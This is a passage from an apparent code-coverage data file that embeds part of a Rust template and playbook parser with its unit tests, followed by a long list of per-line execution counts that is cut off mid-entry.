k {\n                        Some((key.clone(), yaml_to_minijinja_value(v)))\n                    } else {\n                        None\n                    }\n                })\n                .collect();\n            Value::from_iter(items)\n        }\n        serde_yaml::Value::Tagged(tagged) =\u003e yaml_to_minijinja_value(\u0026tagged.value),\n    }\n}\n\n/// Evaluate a condition expression\npub fn evaluate_condition(\n    condition: \u0026str,\n    vars: \u0026IndexMap\u003cString, serde_yaml::Value\u003e,\n) -\u003e ParseResult\u003cbool\u003e {\n    let parser = Parser::new();\n\n    // Wrap in {{ }} if not already a template\n    let template = if condition.contains(\"{{\") {\n        condition.to_string()\n    } else {\n        format!(\"{{{{ {} }}}}\", condition)\n    };\n\n    let result = parser.render_template(\u0026template, vars)?;\n\n    // Parse the result as a boolean\n    Ok(matches!(\n        result.trim().to_lowercase().as_str(),\n        \"true\" | \"yes\" | \"1\"\n    ))\n}\n\n/// Extract variable references from a template string\npub fn extract_variables(template: \u0026str) -\u003e Vec\u003cString\u003e {\n    let var_pattern =\n        regex::Regex::new(r\"\\{\\{\\s*([a-zA-Z_][a-zA-Z0-9_]*(?:\\.[a-zA-Z_][a-zA-Z0-9_]*)*)\\s*\\}\\}\")\n            .unwrap();\n\n    var_pattern\n        .captures_iter(template)\n        .filter_map(|cap| cap.get(1).map(|m| m.as_str().to_string()))\n        .collect()\n}\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n\n    #[test]\n    fn test_parser_new() {\n        let parser = Parser::new();\n        assert!(!parser.strict);\n    }\n\n    #[test]\n    fn test_render_template() {\n        let parser = Parser::new();\n        let mut vars = IndexMap::new();\n        vars.insert(\n            \"name\".to_string(),\n            serde_yaml::Value::String(\"world\".to_string()),\n        );\n\n        let result = parser.render_template(\"Hello, {{ name }}!\", \u0026vars).unwrap();\n        assert_eq!(result, \"Hello, world!\");\n    }\n\n    #[test]\n    fn test_has_template() {\n        let parser = Parser::new();\n        assert!(parser.has_template(\"{{ var }}\"));\n        assert!(parser.has_template(\"{% if condition %}\"));\n        assert!(parser.has_template(\"{# comment #}\"));\n        assert!(!parser.has_template(\"plain string\"));\n    }\n\n    #[test]\n    fn test_parse_playbook_str() {\n        let parser = Parser::new();\n        let content = r#\"\n- name: Test Play\n  hosts: all\n  tasks:\n    - name: Test Task\n      debug:\n        msg: \"Hello\"\n\"#;\n\n        let playbook = parser.parse_playbook_str(content).unwrap();\n        assert_eq!(playbook.play_count(), 1);\n        assert_eq!(playbook.plays[0].name, \"Test Play\");\n        assert_eq!(playbook.plays[0].tasks.len(), 1);\n    }\n\n    #[test]\n    fn test_parse_vars_str() {\n        let parser = Parser::new();\n        let content = r#\"\nhttp_port: 80\napp_name: myapp\ndebug: true\n\"#;\n\n        let vars = parser.parse_vars_str(content).unwrap();\n        assert_eq!(vars.len(), 3);\n        assert_eq!(\n            vars.get(\"http_port\"),\n            Some(\u0026serde_yaml::Value::Number(80.into()))\n        );\n    }\n\n    #[test]\n    fn test_evaluate_condition() {\n        let mut vars = IndexMap::new();\n        vars.insert(\"enabled\".to_string(), serde_yaml::Value::Bool(true));\n\n        assert!(evaluate_condition(\"enabled\", \u0026vars).unwrap());\n        assert!(evaluate_condition(\"enabled == true\", \u0026vars).unwrap());\n    }\n\n    #[test]\n    fn test_extract_variables() {\n        let template = \"Hello {{ name }}, welcome to {{ place }}!\";\n        let vars = extract_variables(template);\n        assert_eq!(vars, vec![\"name\", \"place\"]);\n    }\n\n    #[test]\n    fn test_filters() {\n        let parser = Parser::new();\n        let vars = IndexMap::new();\n\n        // Test lower filter\n        let result = parser\n            .render_template(\"{{ 'HELLO' | lower }}\", \u0026vars)\n            .unwrap();\n        assert_eq!(result, \"hello\");\n\n        // Test upper filter\n        let result = parser\n            .render_template(\"{{ 'hello' | upper }}\", \u0026vars)\n            .unwrap();\n        assert_eq!(result, \"HELLO\");\n\n        // Test default filter\n        let result = parser\n            .render_template(\"{{ undefined_var | default('default_value') }}\", \u0026vars)\n            .unwrap();\n        assert_eq!(result, \"default_value\");\n    }\n}\n","traces":[{"line":46,"address":[36454220,36454119],"length":1,"stats":{"Line":0}},{"line":61,"address":[49008956,49009455],"length":1,"stats":{"Line":0}},{"line":62,"address":[49009727,49009525],"length":1,"stats":{"Line":0}},{"line":63,"address":[36445916],"length":1,"stats":{"Line":0}},{"line":67,"address":[49009940,49011329,49011079,49008825,49009410,49010505,49008982,49011092],"length":1,"stats":{"Line":0}},{"line":69,"address":[49009001],"length":1,"stats":{"Line":0}},{"line":70,"address":[49008704,49011116,49011351,49009375,49011383],"length":1,"stats":{"Line":0}},{"line":73,"address":[49019366],"length":1,"stats":{"Line":0}},{"line":74,"address":[49019437],"length":1,"stats":{"Line":0}},{"line":77,"address":[49019821,49020140],"length":1,"stats":{"Line":0}},{"line":80,"address":[44695749],"length":1,"stats":{"Line":0}},{"line":90,"address":[36012320,36012384,36012288,36012392,36012432,36012438,36012277,36012272,36012400,36012419],"length":1,"stats":{"Line":5}},{"line":91,"address":[44708076],"length":1,"stats":{"Line":1}},{"line":92,"address":[49011501],"length":1,"stats":{"Line":1}},{"line":97,"address":[49013475,49012707,49012304],"length":1,"stats":{"Line":0}},{"line":98,"address":[49013091,49013341],"length":1,"stats":{"Line":0}},{"line":102,"address":[36034098],"length":1,"stats":{"Line":1}},{"line":105,"address":[49011911,49013381,49011754,49013477,49013716,49013394,49012159,49012688],"length":1,"stats":{"Line":4}},{"line":106,"address":[36034112],"length":1,"stats":{"Line":1}},{"line":107,"address":[36034125,36034166],"length":1,"stats":{"Line":3}},{"line":108,"address":[49011517,49011633,49012138,49013506,49013738,49013775],"length":1,"stats":{"Line":1}},{"line":109,"address":[36034240],"length":1,"stats":{"Line":0}},{"line":110,"address":[49049338,49046416,49049166],"length":1,"stats":{"Line":0}},{"line":113,"address":[36034295],"length":1,"stats":{"Line":0}},{"line":114,"address":[49046563,49047912,49046798,49046674],"length":1,"stats":{"Line":0}},{"line":115,"address":[49046885,49047240],"length":1,"stats":{"Line":0}},{"line":116,"address":[49047293,49047414],"length":1,"stats":{"Line":0}},{"line":117,"address":[36034325],"length":1,"stats":{"Line":0}},{"line":118,"address":[36034338,36034380],"length":1,"stats":{"Line":0}},{"line":120,"address":[36034176],"length":1,"stats":{"Line":0}},{"line":121,"address":[49047859,49047981],"length":1,"stats":{"Line":0}},{"line":125,"address":[36034222],"length":1,"stats":{"Line":0}},{"line":126,"address":[49048113,49048572],"length":1,"stats":{"Line":0}},{"line":128,"address":[49049024,49048008],"length":1,"stats":{"Line":0}},{"line":132,"address":[36034929,36034482,36034818,36034860,36034524,36034593],"length":1,"stats":{"Line":0}},{"line":137,"address":[49047174,49048934,49046517,49049319,49049356,49046633],"length":1,"stats":{"Line":0}},{"line":138,"address":[36034708,36035044],"length":1,"stats":{"Line":0}},{"line":139,"address":[36034662,36034998,36034731,36035067],"length":1,"stats":{"Line":0}},{"line":144,"address":[49003167,49001248,49001359,49001483],"length":1,"stats":{"Line":0}},{"line":145,"address":[49002095,49001570],"length":1,"stats":{"Line":0}},{"line":150,"address":[49002968],"length":1,"stats":{"Line":0}},{"line":151,"address":[49003138,49003191],"length":1,"stats":{"Line":0}},{"line":152,"address":[49003436,49002122],"length":1,"stats":{"Line":0}},{"line":154,"address":[49001596,49003556,49002050,49002457,49001439,49003159,49003172,49003257],"length":1,"stats":{"Line":0}},{"line":159,"address":[49070175,49067488,49071460],"length":1,"stats":{"Line":0}},{"line":160,"address":[49067516],"length":1,"stats":{"Line":0}},{"line":161,"address":[49067616],"length":1,"stats":{"Line":0}},{"line":164,"address":[49067801,49067682,49071179,49067925],"length":1,"stats":{"Line":0}},{"line":165,"address":[49068012,49068725],"length":1,"stats":{"Line":0}},{"line":167,"address":[49070052,49068843],"length":1,"stats":{"Line":0}},{"line":172,"address":[49069083],"length":1,"stats":{"Line":0}},{"line":179,"address":[49069495,49069718,49068829],"length":1,"stats":{"Line":0}},{"line":180,"address":[49069501],"length":1,"stats":{"Line":0}},{"line":181,"address":[49069655],"length":1,"stats":{"Line":0}},{"line":183,"address":[49069970],"length":1,"stats":{"Line":0}},{"line":185,"address":[49071553],"length":1,"stats":{"Line":0}},{"line":190,"address":[49068883,49070185,49070408],"length":1,"stats":{"Line":0}},{"line":191,"address":[49070191],"length":1,"stats":{"Line":0}},{"line":192,"address":[49070345],"length":1,"stats":{"Line":0}},{"line":194,"address":[49070308,49070420],"length":1,"stats":{"Line":0}},{"line":198,"address":[49070531],"length":1,"stats":{"Line":0}},{"line":203,"address":[49071316,49068772],"length":1,"stats":{"Line":0}},{"line":207,"address":[49068057],"length":1,"stats":{"Line":0}},{"line":209,"address":[49068120],"length":1,"stats":{"Line":0}},{"line":212,"address":[49068269,49068098],"length":1,"stats":{"Line":0}},{"line":219,"address":[49079216,49082964,49081598],"length":1,"stats":{"Line":1}},{"line":220,"address":[49079258],"length":1,"stats":{"Line":1}},{"line":222,"address":[49084496,49083248,49084589],"length":1,"stats":{"Line":0}},{"line":223,"address":[49084334,49083296],"length":1,"stats":{"Line":0}},{"line":224,"address":[49083312,49083372,49084504],"length":1,"stats":{"Line":0}},{"line":225,"address":[49083688,49083751],"length":1,"stats":{"Line":0}},{"line":226,"address":[49083823],"length":1,"stats":{"Line":0}},{"line":228,"address":[49083843],"length":1,"stats":{"Line":0}},{"line":233,"address":[49083876,49084300],"length":1,"stats":{"Line":0}},{"line":234,"address":[49083703,49084256,49084465],"length":1,"stats":{"Line":0}},{"line":235,"address":[49083331,49084484,49084446,49084511],"length":1,"stats":{"Line":0}},{"line":237,"address":[49079340,49079274],"length":1,"stats":{"Line":2}},{"line":239,"address":[49079940,49080082,49080221,49079422],"length":1,"stats":{"Line":0}},{"line":241,"address":[49079913,49083008,49080002,49083055],"length":1,"stats":{"Line":0}},{"line":243,"address":[49080492],"length":1,"stats":{"Line":0}},{"line":244,"address":[49080306,49079454,49080448,49080524],"length":1,"stats":{"Line":0}},{"line":245,"address":[49080252],"length":1,"stats":{"Line":0}},{"line":247,"address":[49080519],"length":1,"stats":{"Line":0}},{"line":252,"address":[49080746,49080804,49080840],"length":1,"stats":{"Line":0}},{"line":253,"address":[49080810],"length":1,"stats":{"Line":0}},{"line":255,"address":[49082412,49082701,49079807],"length":1,"stats":{"Line":0}},{"line":257,"address":[49079730,49082407,49082087],"length":1,"stats":{"Line":0}},{"line":258,"address":[49082320],"length":1,"stats":{"Line":0}},{"line":259,"address":[49082328],"length":1,"stats":{"Line":0}},{"line":262,"address":[49079653,49081847],"length":1,"stats":{"Line":0}},{"line":269,"address":[49080150],"length":1,"stats":{"Line":1}},{"line":270,"address":[49082714,49082677,49080202,49082985,49079292,49080223],"length":1,"stats":{"Line":2}},{"line":273,"address":[49099346,49097264,49099321],"length":1,"stats":{"Line":1}},{"line":275,"address":[49097341],"length":1,"stats":{"Line":1}},{"line":280,"address":[49098261,49098863],"length":1,"stats":{"Line":2}},{"line":281,"address":[49098152,49099221],"length":1,"stats":{"Line":0}},{"line":283,"address":[49099299,49097600,49097757,49098074,49098818,49098833],"length":1,"stats":{"Line":2}},{"line":285,"address":[49097776],"length":1,"stats":{"Line":1}},{"line":293,"address":[49099518,49099756,49101592,49099632],"length":1,"stats":{"Line":0}},{"line":294,"address":[49100234,49099843],"length":1,"stats":{"Line":0}},{"line":295,"address":[49100316,49100528],"length":1,"stats":{"Line":0}},{"line":296,"address":[49100805,49100347],"length":1,"stats":{"Line":0}},{"line":303,"address":[49099472,49099588,49100168,49101621,49101816,49101853],"length":1,"stats":{"Line":0}},{"line":310,"address":[49089598,49089836,49091018,49089712],"length":1,"stats":{"Line":0}},{"line":311,"address":[49089923,49090311],"length":1,"stats":{"Line":0}},{"line":312,"address":[49091023,49090374,49090535],"length":1,"stats":{"Line":0}},{"line":313,"address":[49091055,49090453],"length":1,"stats":{"Line":0}},{"line":314,"address":[49090344,49091413],"length":1,"stats":{"Line":0}},{"line":322,"address":[49094705],"length":1,"stats":{"Line":0}},{"line":325,"address":[49097090,49096514,49095499],"length":1,"stats":{"Line":0}},{"line":330,"address":[49097119,49095356],"length":1,"stats":{"Line":0}},{"line":332,"address":[49097058,49097197,49095919,49095041,49094884,49097071,49095259,49096484],"length":1,"stats":{"Line":0}},{"line":333,"address":[49095060],"length":1,"stats":{"Line":0}},{"line":334,"address":[49097238,49094763,49095238,49097095],"length":1,"stats":{"Line":0}},{"line":336,"address":[49063821,49061486,49060480],"length":1,"stats":{"Line":0}},{"line":337,"address":[49060497],"length":1,"stats":{"Line":0}},{"line":338,"address":[49060544],"length":1,"stats":{"Line":0}},{"line":339,"address":[49060560],"length":1,"stats":{"Line":0}},{"line":342,"address":[49061537,49060839],"length":1,"stats":{"Line":0}},{"line":345,"address":[49061627,49061892],"length":1,"stats":{"Line":0}},{"line":348,"address":[49061614],"length":1,"stats":{"Line":0}},{"line":356,"address":[49061319],"length":1,"stats":{"Line":0}},{"line":358,"address":[49060587,49063834,49063799,49063607,49061457],"length":1,"stats":{"Line":0}},{"line":361,"address":[49071984,49073325,49073195],"length":1,"stats":{"Line":1}},{"line":362,"address":[49072014],"length":1,"stats":{"Line":1}},{"line":364,"address":[49073360,49074662,49074755],"length":1,"stats":{"Line":0}},{"line":365,"address":[49073408,49074475],"length":1,"stats":{"Line":0}},{"line":366,"address":[49073484,49074670,49073424],"length":1,"stats":{"Line":0}},{"line":368,"address":[49073940],"length":1,"stats":{"Line":0}},{"line":371,"address":[49073970],"length":1,"stats":{"Line":0}},{"line":376,"address":[49074426,49073820,49074631],"length":1,"stats":{"Line":0}},{"line":382,"address":[49072529,49072211,49072694],"length":1,"stats":{"Line":3}},{"line":383,"address":[49072650,49073151],"length":1,"stats":{"Line":1}},{"line":386,"address":[49072461],"length":1,"stats":{"Line":1}},{"line":387,"address":[49072045,49072516,49072507,49073343],"length":1,"stats":{"Line":2}},{"line":390,"address":[49091598],"length":1,"stats":{"Line":1}},{"line":395,"address":[49093709,49093772],"length":1,"stats":{"Line":0}},{"line":396,"address":[49093864],"length":1,"stats":{"Line":0}},{"line":399,"address":[49093854],"length":1,"stats":{"Line":0}},{"line":400,"address":[49093894],"length":1,"stats":{"Line":0}},{"line":404,"address":[49093907],"length":1,"stats":{"Line":0}},{"line":405,"address":[49094545,49093724,49094340],"length":1,"stats":{"Line":0}},{"line":406,"address":[49094591,49093347,49094564,49094526],"length":1,"stats":{"Line":0}},{"line":409,"address":[49092199,49091817],"length":1,"stats":{"Line":2}},{"line":410,"address":[49091746,49092184,49091912],"length":1,"stats":{"Line":0}},{"line":412,"address":[49091886,49092438,49092603],"length":1,"stats":{"Line":3}},{"line":413,"address":[49092559,49093060],"length":1,"stats":{"Line":1}},{"line":414,"address":[49093114,49091723],"length":1,"stats":{"Line":0}},{"line":420,"address":[49040528,49043920],"length":1,"stats":{"Line":1}},{"line":421,"address":[49040545],"length":1,"stats":{"Line":1}},{"line":422,"address":[49040566],"length":1,"stats":{"Line":1}},{"line":425,"address":[49041188,49040860],"length":1,"stats":{"Line":2}},{"line":427,"address":[49042742,49041434],"length":1,"stats":{"Line":0}},{"line":428,"address":[49041352,49042193],"length":1,"stats":{"Line":2}},{"line":429,"address":[49041270,49041617],"length":1,"stats":{"Line":0}},{"line":430,"address":[49043291,49041516,49043867],"length":1,"stats":{"Line":0}},{"line":435,"address":[49040905],"length":1,"stats":{"Line":1}},{"line":436,"address":[49041060],"length":1,"stats":{"Line":1}},{"line":437,"address":[49041073],"length":1,"stats":{"Line":1}},{"line":438,"address":[49043939,49043872,49040608,49041122],"length":1,"stats":{"Line":1}},{"line":440,"address":[49050587,49049376,49050717],"length":1,"stats":{"Line":1}},{"line":443,"address":[49050892,49052252,49050752,49053539,49050800],"length":1,"stats":{"Line":0}},{"line":444,"address":[49052069],"length":1,"stats":{"Line":0}},{"line":445,"address":[49051222,49050951,49052258],"length":1,"stats":{"Line":0}},{"line":447,"address":[49051717,49051543],"length":1,"stats":{"Line":0}},{"line":448,"address":[49052214,49052020,49051673],"length":1,"stats":{"Line":0}},{"line":452,"address":[49052755,49052581],"length":1,"stats":{"Line":0}},{"line":456,"address":[49053400,49050928],"length":1,"stats":{"Line":0}},{"line":458,"address":[49053328,49053525,49053557,49052233,49050847,49052200,49053242],"length":1,"stats":{"Line":0}},{"line":463,"address":[49050086,49049603,49049921],"length":1,"stats":{"Line":3}},{"line":464,"address":[49050543,49050042],"length":1,"stats":{"Line":1}},{"line":465,"address":[49049514,49050597],"length":1,"stats":{"Line":0}},{"line":467,"address":[49049853],"length":1,"stats":{"Line":1}},{"line":468,"address":[49050735,49049899,49049437,49049908],"length":1,"stats":{"Line":2}},{"line":471,"address":[49003670],"length":1,"stats":{"Line":0}},{"line":473,"address":[49004749,49003756,49003864,49003979],"length":1,"stats":{"Line":0}},{"line":474,"address":[49004066,49004297],"length":1,"stats":{"Line":0}},{"line":480,"address":[49004092,49004924,49004741,49004754,49003935,49004252],"length":1,"stats":{"Line":0}},{"line":485,"address":[49064677,49063856],"length":1,"stats":{"Line":0}},{"line":486,"address":[49063878],"length":1,"stats":{"Line":0}},{"line":488,"address":[49064067,49064185,49063956],"length":1,"stats":{"Line":0}},{"line":489,"address":[49064264,49064398],"length":1,"stats":{"Line":0}},{"line":497,"address":[49064316],"length":1,"stats":{"Line":0}},{"line":498,"address":[49064026,49064342,49064701,49063910],"length":1,"stats":{"Line":0}},{"line":500,"address":[49053568,49054501,49056369],"length":1,"stats":{"Line":0}},{"line":506,"address":[49054552,49054072],"length":1,"stats":{"Line":0}},{"line":509,"address":[49054605,49054711,49055237],"length":1,"stats":{"Line":0}},{"line":510,"address":[49055024,49054744],"length":1,"stats":{"Line":0}},{"line":516,"address":[49054625,49055242],"length":1,"stats":{"Line":0}},{"line":519,"address":[49056189,49054579],"length":1,"stats":{"Line":0}},{"line":521,"address":[49054098,49056309,49054507,49054997,49055919,49053941,49056007,49055932],"length":1,"stats":{"Line":0}},{"line":526,"address":[49067446,49064720,49067421],"length":1,"stats":{"Line":1}},{"line":527,"address":[49064742,49064843],"length":1,"stats":{"Line":2}},{"line":528,"address":[49064857],"length":1,"stats":{"Line":1}},{"line":530,"address":[49065115,49067251,49064880,49064991],"length":1,"stats":{"Line":4}},{"line":532,"address":[49067142],"length":1,"stats":{"Line":1}},{"line":539,"address":[49065741,49066473],"length":1,"stats":{"Line":0}},{"line":540,"address":[49065633,49067279],"length":1,"stats":{"Line":0}},{"line":542,"address":[49065549,49067399,49066422,49066443,49067243,49067256,49065228,49065071],"length":1,"stats":{"Line":4}},{"line":543,"address":[49065247],"length":1,"stats":{"Line":1}},{"line":544,"address":[49067464,49067022,49064950,49064789,49065528,49067427],"length":1,"stats":{"Line":1}},{"line":546,"address":[49059432,49060450,49058544],"length":1,"stats":{"Line":0}},{"line":547,"address":[49058566,49058667],"length":1,"stats":{"Line":0}},{"line":548,"address":[49058681],"length":1,"stats":{"Line":0}},{"line":549,"address":[49058707],"length":1,"stats":{"Line":0}},{"line":551,"address":[49058723,49058834,49058958],"length":1,"stats":{"Line":0}},{"line":552,"address":[49059037,49059486],"length":1,"stats":{"Line":0}},{"line":553,"address":[49060291],"length":1,"stats":{"Line":0}},{"line":554,"address":[49060208,49059629],"length":1,"stats":{"Line":0}},{"line":557,"address":[49059599,49059959],"length":1,"stats":{"Line":0}},{"line":565,"address":[49059082],"length":1,"stats":{"Line":0}},{"line":566,"address":[49059408,49060468,49058793,49060394,49058613],"length":1,"stats":{"Line":0}},{"line":568,"address":[49019284,49019309,49017936],"length":1,"stats":{"Line":0}},{"line":569,"address":[49017958,49018051],"length":1,"stats":{"Line":0}},{"line":570,"address":[49018065],"length":1,"stats":{"Line":0}},{"line":573,"address":[49018680,49018402],"length":1,"stats":{"Line":0}},{"line":579,"address":[49018810,49019194],"length":1,"stats":{"Line":0}},{"line":581,"address":[49018720],"length":1,"stats":{"Line":0}},{"line":583,"address":[49019071,49018279,49018632,49018428],"length":1,"stats":{"Line":0}},{"line":585,"address":[49018447],"length":1,"stats":{"Line":0}},{"line":589,"address":[49028862,49028774],"length":1,"stats":{"Line":0}},{"line":590,"address":[49028875],"length":1,"stats":{"Line":0}},{"line":591,"address":[49028896],"length":1,"stats":{"Line":0}},{"line":593,"address":[49028904,49029015,49030078,49029139],"length":1,"stats":{"Line":0}},{"line":599,"address":[49029765,49029575],"length":1,"stats":{"Line":0}},{"line":601,"address":[49029605,49029852],"length":1,"stats":{"Line":0}},{"line":602,"address":[49029747],"length":1,"stats":{"Line":0}},{"line":603,"address":[49030065],"length":1,"stats":{"Line":0}},{"line":610,"address":[49029281],"length":1,"stats":{"Line":0}},{"line":613,"address":[49034236,49036509,49033120],"length":1,"stats":{"Line":0}},{"line":614,"address":[49033278,49033157],"length":1,"stats":{"Line":0}},{"line":615,"address":[49033298],"length":1,"stats":{"Line":0}},{"line":620,"address":[49036183],"length":1,"stats":{"Line":0}},{"line":623,"address":[49036282],"length":1,"stats":{"Line":0}},{"line":624,"address":[49036196,49034578],"length":1,"stats":{"Line":0}},{"line":626,"address":[49034618,49034352],"length":1,"stats":{"Line":0}},{"line":627,"address":[49034384,49034846],"length":1,"stats":{"Line":0}},{"line":628,"address":[49035431,49034466],"length":1,"stats":{"Line":0}},{"line":629,"address":[49034326,49036323],"length":1,"stats":{"Line":0}},{"line":631,"address":[49036287,49033531,49036443,49034242,49033688,49034827,49035401,49036300],"length":1,"stats":{"Line":0}},{"line":633,"address":[49033707],"length":1,"stats":{"Line":0}},{"line":634,"address":[49036527,49036465,49033218,49034207,49035989,49033410],"length":1,"stats":{"Line":0}},{"line":637,"address":[49030315,49030207],"length":1,"stats":{"Line":0}},{"line":641,"address":[49030534,49030423,49032884,49030658],"length":1,"stats":{"Line":0}},{"line":642,"address":[49031085,49030745],"length":1,"stats":{"Line":0}},{"line":644,"address":[49031378,49031171,49031502],"length":1,"stats":{"Line":0}},{"line":645,"address":[49031690,49031581],"length":1,"stats":{"Line":0}},{"line":648,"address":[49031717],"length":1,"stats":{"Line":0}},{"line":654,"address":[49032148,49032024,49031254],"length":1,"stats":{"Line":0}},{"line":656,"address":[49032442,49032380],"length":1,"stats":{"Line":0}},{"line":662,"address":[49032915,49031142],"length":1,"stats":{"Line":0}},{"line":664,"address":[49032876,49032889,49030774,49031037,49030614,49031623,49033036],"length":1,"stats":{"Line":0}},{"line":666,"address":[49030793],"length":1,"stats":{"Line":0}},{"line":667,"address":[49030260,49033058,49031021,49030493,49033101],"length":1,"stats":{"Line":0}},{"line":669,"address":[49079182,49077270,49074768],"length":1,"stats":{"Line":0}},{"line":670,"address":[49074799,49074915],"length":1,"stats":{"Line":0}},{"line":671,"address":[49074934],"length":1,"stats":{"Line":0}},{"line":672,"address":[49074988],"length":1,"stats":{"Line":0}},{"line":673,"address":[49075014],"length":1,"stats":{"Line":0}},{"line":675,"address":[49075196,49075320,49076575,49075082],"length":1,"stats":{"Line":0}},{"line":676,"address":[49075967,49075407],"length":1,"stats":{"Line":0}},{"line":679,"address":[49076522,49076628],"length":1,"stats":{"Line":0}},{"line":682,"address":[49076743,49077276],"length":1,"stats":{"Line":0}},{"line":684,"address":[49076977],"length":1,"stats":{"Line":0}},{"line":685,"address":[49076895,49076711],"length":1,"stats":{"Line":0}},{"line":686,"address":[49076914],"length":1,"stats":{"Line":0}},{"line":687,"address":[49076933],"length":1,"stats":{"Line":0}},{"line":698,"address":[49076229,49078722],"length":1,"stats":{"Line":0}},{"line":704,"address":[49078634,49078483],"length":1,"stats":{"Line":0}},{"line":707,"address":[49078604,49078180,49078326],"length":1,"stats":{"Line":0}},{"line":709,"address":[49079017,49076028],"length":1,"stats":{"Line":0}},{"line":711,"address":[49075436,49077740,49075276,49079138,49075919,49076567],"length":1,"stats":{"Line":0}},{"line":713,"address":[49075895,49079160,49075152,49074860,49075033,49079203,49078959],"length":1,"stats":{"Line":0}},{"line":719,"address":[49005230],"length":1,"stats":{"Line":0}},{"line":721,"address":[49005536,49005412,49005298,49006753],"length":1,"stats":{"Line":0}},{"line":722,"address":[49005623,49006157],"length":1,"stats":{"Line":0}},{"line":724,"address":[49006621,49006497,49006243],"length":1,"stats":{"Line":0}},{"line":725,"address":[49006809,49006700],"length":1,"stats":{"Line":0}},{"line":727,"address":[49007348,49006948],"length":1,"stats":{"Line":0}},{"line":733,"address":[49008090,49006415],"length":1,"stats":{"Line":0}},{"line":735,"address":[49007571,49006329,49007447],"length":1,"stats":{"Line":0}},{"line":736,"address":[49007650,49007743],"length":1,"stats":{"Line":0}},{"line":737,"address":[49007838,49007900],"length":1,"stats":{"Line":0}},{"line":738,"address":[49007999,49007865],"length":1,"stats":{"Line":0}},{"line":740,"address":[49007783],"length":1,"stats":{"Line":0}},{"line":744,"address":[49008407,49006214],"length":1,"stats":{"Line":0}},{"line":746,"address":[49005652,49006109,49008528,49006745,49005492,49008322],"length":1,"stats":{"Line":0}},{"line":748,"address":[49005671],"length":1,"stats":{"Line":0}},{"line":749,"address":[49005368,49008550,49005076,49008349,49006085,49005249,49008593],"length":1,"stats":{"Line":0}},{"line":752,"address":[49044079,49044010],"length":1,"stats":{"Line":0}},{"line":756,"address":[49044306,49045936,49044395,49045983],"length":1,"stats":{"Line":0}},{"line":758,"address":[49044976],"length":1,"stats":{"Line":0}},{"line":759,"address":[49044932,49044181,49045034,49044790],"length":1,"stats":{"Line":0}},{"line":760,"address":[49044736],"length":1,"stats":{"Line":0}},{"line":761,"address":[49044763,49044852,49046225,49046176],"length":1,"stats":{"Line":0}},{"line":762,"address":[49045029],"length":1,"stats":{"Line":0}},{"line":763,"address":[49045187,49044245],"length":1,"stats":{"Line":0}},{"line":766,"address":[49045430,49045346,49045469],"length":1,"stats":{"Line":0}},{"line":768,"address":[49045536],"length":1,"stats":{"Line":0}},{"line":774,"address":[49044572,49045633],"length":1,"stats":{"Line":0}},{"line":775,"address":[49045047,49045659,49044715,49044036],"length":1,"stats":{"Line":0}},{"line":777,"address":[49039601,49036544,49039516],"length":1,"stats":{"Line":0}},{"line":778,"address":[49036566],"length":1,"stats":{"Line":0}},{"line":779,"address":[49036667],"length":1,"stats":{"Line":0}},{"line":781,"address":[49038303,49036961,49036837,49036726],"length":1,"stats":{"Line":0}},{"line":782,"address":[49037048,49037330],"length":1,"stats":{"Line":0}},{"line":783,"address":[49037379,49037549],"length":1,"stats":{"Line":0}},{"line":786,"address":[49037437],"length":1,"stats":{"Line":0}},{"line":787,"address":[49039286,49037873,49037749,49037453],"length":1,"stats":{"Line":0}},{"line":788,"address":[49037960,49038372],"length":1,"stats":{"Line":0}},{"line":793,"address":[49038005],"length":1,"stats":{"Line":0}},{"line":799,"address":[49037093],"length":1,"stats":{"Line":0}},{"line":800,"address":[49037277,49036796,49036683,49039619,49036626,49039459],"length":1,"stats":{"Line":0}},{"line":802,"address":[49087686,49084848,49089141],"length":1,"stats":{"Line":0}},{"line":803,"address":[49084879,49085003],"length":1,"stats":{"Line":0}},{"line":804,"address":[49085022],"length":1,"stats":{"Line":0}},{"line":806,"address":[49085091],"length":1,"stats":{"Line":0}},{"line":812,"address":[49086440,49087993,49086564,49086186],"length":1,"stats":{"Line":0}},{"line":813,"address":[49086651,49086751],"length":1,"stats":{"Line":0}},{"line":814,"address":[49087795,49086896],"length":1,"stats":{"Line":0}},{"line":815,"address":[49086926,49087894],"length":1,"stats":{"Line":0}},{"line":817,"address":[49086956,49086817],"length":1,"stats":{"Line":0}},{"line":823,"address":[49087730,49086520,49087998,49087985,49087623,49086706,49086795,49086674],"length":1,"stats":{"Line":0}},{"line":825,"address":[49086358,49088697],"length":1,"stats":{"Line":0}},{"line":827,"address":[49086272,49088176,49088052],"length":1,"stats":{"Line":0}},{"line":832,"address":[49088388],"length":1,"stats":{"Line":0}},{"line":834,"address":[49088278,49088132,49088421],"length":1,"stats":{"Line":0}},{"line":836,"address":[49086160,49088998],"length":1,"stats":{"Line":0}},{"line":838,"address":[49089119,49086055,49085416,49086693,49085576,49087757],"length":1,"stats":{"Line":0}},{"line":840,"address":[49085595],"length":1,"stats":{"Line":0}},{"line":848,"address":[49021909],"length":1,"stats":{"Line":1}},{"line":853,"address":[49022027,49022265,49022141,49028216],"length":1,"stats":{"Line":4}},{"line":854,"address":[49022352,49023358],"length":1,"stats":{"Line":2}},{"line":856,"address":[49023454],"length":1,"stats":{"Line":1}},{"line":857,"address":[49023801,49024052,49023928,49026871],"length":1,"stats":{"Line":4}},{"line":858,"address":[49025056,49024139],"length":1,"stats":{"Line":2}},{"line":859,"address":[49026673,49025330],"length":1,"stats":{"Line":2}},{"line":860,"address":[49026772,49025360],"length":1,"stats":{"Line":2}},{"line":862,"address":[49026018],"length":1,"stats":{"Line":1}},{"line":866,"address":[49025101],"length":1,"stats":{"Line":0}},{"line":868,"address":[49025448,49024168,49026863,49026025,49024008,49025008,49026876],"length":1,"stats":{"Line":4}},{"line":870,"address":[49025003,49024187],"length":1,"stats":{"Line":1}},{"line":871,"address":[49024228,49024315],"length":1,"stats":{"Line":2}},{"line":874,"address":[49024747],"length":1,"stats":{"Line":0}},{"line":876,"address":[49024524,49026616,49023884],"length":1,"stats":{"Line":1}},{"line":882,"address":[49023562],"length":1,"stats":{"Line":1}},{"line":884,"address":[49027660],"length":1,"stats":{"Line":1}},{"line":888,"address":[49023432,49023608],"length":1,"stats":{"Line":0}},{"line":891,"address":[49027043,49026919,49023476],"length":1,"stats":{"Line":3}},{"line":893,"address":[49027372,49027310],"length":1,"stats":{"Line":2}},{"line":894,"address":[49027471,49027337],"length":1,"stats":{"Line":2}},{"line":898,"address":[49026999,49027145,49027288],"length":1,"stats":{"Line":2}},{"line":900,"address":[49028499,49023403],"length":1,"stats":{"Line":0}},{"line":902,"address":[49028221,49023310,49022221,49026635,49022